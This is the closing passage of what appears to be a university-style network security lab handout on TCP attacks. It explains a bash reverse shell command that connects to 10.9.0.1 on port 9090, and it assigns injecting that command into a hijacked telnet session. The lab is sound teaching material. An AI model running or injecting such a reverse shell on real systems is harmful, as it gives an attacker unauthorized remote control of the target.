<code class="docutils literal notranslate"><span class="pre">10.9.0.1</span></code>’s port <code class="docutils literal notranslate"><span class="pre">9090</span></code>. The output <code class="docutils literal notranslate"><span class="pre">stdout</span></code> is represented
by file descriptor number&nbsp;1.</li>
<li><code class="docutils literal notranslate"><span class="pre">&quot;0&lt;&amp;1&quot;</span></code>: File descriptor 0 represents the standard input
(<code class="docutils literal notranslate"><span class="pre">stdin</span></code>). This causes the <code class="docutils literal notranslate"><span class="pre">stdin</span></code> for the shell to be obtained
from the tcp connection.</li>
<li><code class="docutils literal notranslate"><span class="pre">&quot;2&gt;&amp;1&quot;</span></code>: File descriptor 2 represents standard error <code class="docutils literal notranslate"><span class="pre">stderr</span></code>.
This causes the error output to be redirected to the tcp connection.</li>
</ul>
<p>In summary, <code class="docutils literal notranslate"><span class="pre">&quot;/bin/bash</span> <span class="pre">-i</span> <span class="pre">&gt;</span> <span class="pre">/dev/tcp/10.9.0.1/9090</span> <span class="pre">0&lt;&amp;1</span> <span class="pre">2&gt;&amp;1&quot;</span></code> starts
a <code class="docutils literal notranslate"><span class="pre">bash</span></code> shell, with its input coming from a tcp connection, and its
standard and error outputs being redirected to the same tcp connection.</p>
<p>In the demo shown above, when the <code class="docutils literal notranslate"><span class="pre">bash</span></code> shell command is executed on
<code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>, it connects back to the <code class="docutils literal notranslate"><span class="pre">netcat</span></code> process started on
<code class="docutils literal notranslate"><span class="pre">10.9.0.1</span></code>. This is confirmed via the
<code class="docutils literal notranslate"><span class="pre">&quot;Connection</span> <span class="pre">received</span> <span class="pre">on</span> <span class="pre">10.9.0.5&quot;</span></code> message displayed by <code class="docutils literal notranslate"><span class="pre">netcat</span></code>.</p>
<p>The description above shows how you can set up a reverse shell if you
have the access to the target machine, which is the <code class="docutils literal notranslate"><span class="pre">telnet</span></code> server in
our setup, but in this task, you do not have such an access. Your task
is to launch an TCP session hijacking attack on an existing <code class="docutils literal notranslate"><span class="pre">telnet</span></code>
session between a user and the target server. You need to inject your
malicious command into the hijacked session, so you can get a reverse
shell on the target server.</p>
</div>
<div class="section" id="submission">
<h2>Submission<a class="headerlink" href="#submission" title="Permalink to this headline">¶</a></h2>
<p>You need to submit a detailed lab report, with screenshots, to describe what you have done and what you
have observed. You also need to provide explanation to the observations that are interesting or surprising.
Please also list the important code snippets followed by explanation. Simply attaching code without any
explanation will not receive credits.</p>
</div>
<div class="section" id="acknowledgment">
<h2>Acknowledgment<a class="headerlink" href="#acknowledgment" title="Permalink to this headline">¶</a></h2>
<p>I would like to thank CSender (GitHub ID), Eric Dong, and Chao Gong, for
their suggestions on improving the SYN flooding attack task in this lab.</p>
</div>
</div>


           </div>
           
          </div>
          <footer>
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
        <a href="VPN.html" class="btn btn-neutral float-right" title="Virtual Private Network (VPN) Lab" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
        <a href="Sniffing_Spoofing.html" class="btn btn-neutral float-left" title="Packet Sniffing and Spoofing Lab" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>
        &#169; Copyright 2021, NEXUS Lab.

    </p>
  </div>
    
    
    
    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    
    provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>
        </div>
      </div>

    </section>

  </div>
  

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script>

  
  
    
   

</body>
</html>